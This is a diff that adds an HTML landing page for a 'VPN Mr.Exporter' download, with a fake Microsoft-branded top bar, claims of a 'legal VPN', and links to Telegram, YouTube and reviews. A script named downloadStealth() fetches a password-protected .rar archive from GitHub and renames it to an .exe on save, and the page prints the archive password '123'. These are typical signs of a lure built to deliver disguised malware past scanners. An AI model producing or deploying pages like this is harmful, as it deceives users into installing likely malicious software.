@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mister Exporter</title>
+  <link rel="icon" type="image/png" href="IconGroup1200.ico" />
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: #000;
+      color: #f5f5f5;
+    }
+
+    .topbar {
+      background: radial-gradient(circle, #5a189a 0%, #7b2cbf 40%, #d8b4ff 100%);
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      font-weight: 500;
+      color: #fff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.4);
+      gap: 10px;
+      padding: 0 20px;
+    }
+
+    .topbar-icon {
+      width: 24px;
+      height: 24px;
+      display: inline-block;
+    }
+
+    .hero {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 60px 20px;
+      gap: 50px;
+      flex-wrap: wrap;
+    }
+
+    .hero-text {
+      max-width: 500px;
+      animation: fadeIn 1s ease;
+      text-align: center;
+    }
+
+    .hero-img img {
+      width: 486px;
+      height: 510px;
+      object-fit: cover;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      animation: fadeIn 1.2s ease;
+    }
+
+    h1 {
+      font-size: 46px;
+      color: #c77dff;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 19px;
+      line-height: 1.6;
+      margin-bottom: 30px;
+      color: #f5f5f5;
+    }
+
+    .download-btn {
+      background: linear-gradient(90deg, #7b2cbf, #9d4edd);
+      color: white;
+      padding: 18px 120px;
+      border-radius: 10px;
+      font-size: 22px;
+      text-decoration: none;
+      display: inline-block;
+      cursor: pointer;
+      transition: 0.25s;
+      border: none;
+      box-shadow: 0 0 12px rgba(157,78,221,0.4);
+    }
+
+    .download-btn:hover {
+      transform: scale(1.07);
+      box-shadow: 0 0 20px rgba(157,78,221,0.8);
+    }
+
+    .download-btn:disabled {
+      opacity: 0.6;
+      cursor: default;
+      box-shadow: 0 0 12px rgba(157,78,221,0.2);
+    }
+
+    /* Password под кнопкой */
+    .password-hint {
+      margin-top: 12px;
+      font-size: 18px;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      opacity: 0.95;
+    }
+
+    .lock-icon {
+      width: 20px;
+      height: 20px;
+      transform: translateY(-1px);
+    }
+
+    .socials {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding-bottom: 20px;
+    }
+
+    .socials a {
+      color: #a970ff;
+      text-decoration: none;
+      font-size: 30px;
+      transition: 0.25s;
+    }
+
+    .socials a:hover {
+      color: #fff;
+    }
+
+    .social-icon {
+      width: 22px;
+      height: 22px;
+      vertical-align: middle;
+      margin-right: 6px;
+      transform: translateY(-2px);
+    }
+
+    .info-block {
+      display: none;
+      flex-direction: row;
+      align-items: center;
+      justify-content: flex-start;
+      background: #2a2a2a;
+      padding: 20px;
+      margin: 0 auto 40px auto;
+      max-width: 800px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      gap: 20px;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 900px) {
+      .hero {
+        flex-direction: column;
+        text-align: center;
+      }
+      .hero-img img { width: 90%; }
+      .info-block { flex-direction: column; text-align: center; }
+      .info-block img { margin: 0 0 10px 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="./windows-icon.png" alt="Windows" class="topbar-icon">
+    Microsoft Visual application Mr.Exporter
+  </div>
+
+  <section class="hero">
+    <div class="hero-text">
+      <h1>VPN Mr.Exporter - a legal VPN project. Install a new VPN in seconds.</h1>
+      <p>
+        Beautiful design and convenience.<br>
+        No installation required.<br>
+        Automatic installing.<br>
+        Built-in link to YouTube tutorials.<br>
+        Built-in Windows Defender button.
+      </p>
+
+      <button class="download-btn" id="downloadBtn" onclick="downloadStealth()">
+        ⬇ Download VPN
+      </button>
+
+      <!-- PASSWORD под кнопкой -->
+      <div class="password-hint">
+        <img src="./lock.png" class="lock-icon"> Password: 123
+      </div>
+
+    </div>
+
+    <div class="hero-img">
+      <img src="./screenshot.png" alt="Скриншот утилиты" />
+    </div>
+  </section>
+
+  <div class="socials">
+    <a href="#">
+      <img src="./youtube.png" class="social-icon"> Setup video
+    </a>
+    <a href="#">
+      <img src="./reviews.png" class="social-icon"> Reviews
+    </a>
+    <a href="#">
+      <img src="./telegram.png" class="social-icon"> News
+    </a>
+  </div>
+
+  <div class="info-block" id="infoBlock">
+    <img id="infoImg" src="" alt="Info Image" style="width:150px; border-radius:8px;">
+    <p id="infoText" style="flex:1; font-size:18px; line-height:1.5; color:#fff;"></p>
+  </div>
+
+  <script>
+  async function downloadStealth() {
+    const btn = document.getElementById("downloadBtn");
+    const originalText = btn.textContent;
+    btn.textContent = "Downloading...";
+    btn.disabled = true;
+
+    const url = "https://media.githubusercontent.com/media/MrExporter/VPN/refs/heads/main/VPN_MrExporter.rar";
+
+    try {
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "Mr.Exporter_v1.2.0.exe";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    } catch (error) {
+      alert("Ошибка при скачивании: " + error);
+    }
+
+    setTimeout(() => {
+      btn.textContent = originalText;
+      btn.disabled = false;
+    }, 3000);
+  }
+
+  const infoBlock = document.getElementById("infoBlock");
+  const infoText = document.getElementById("infoText");
+  const infoImg = document.getElementById("infoImg");
+
+  function showInfo(platform) {
+    infoBlock.style.display = "flex";
+
+    switch(platform) {
+      case "News":
+        infoText.innerHTML = `
+          Official Telegram channel:<br><br>
+          <a href="https://t.me/MisterExporter" 
+             target="_blank"
+             style="color:#a970ff; text-decoration:underline;">
+             Open Mr.Exporter channel
+          </a>
+        `;
+        infoImg.src = "./telegram.png";
+        break;
+
+      case "Setup video":
+        infoText.innerHTML = `
+          Video tutorials and instructions:<br><br>
+          <a href="https://www.youtube.com/watch?v=ZnH-1dDT_K4" 
+             target="_blank"
+             style="color:#a970ff; text-decoration:underline;">
+             Open Setup video on YouTube
+          </a>
+        `;
+        infoImg.src = "./youtube.png";
+        break;
+
+      case "Reviews":
+        infoText.innerHTML = `
+          Good reviews and succesfull installs:<br><br>
+          <a href="https://www.facebook.com/LantanoMarkjoel/videos/1344939707324051"
+             target="_blank"
+             style="color:#a970ff; text-decoration:underline;">
+             Open reviews
+          </a>
+        `;
+        infoImg.src = "./reviews.png";
+        break;
+    }
+  }
+
+  document.querySelectorAll('.socials a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      showInfo(a.textContent.trim());
+    });
+  });
+  </script>
+
+</body>
+</html>
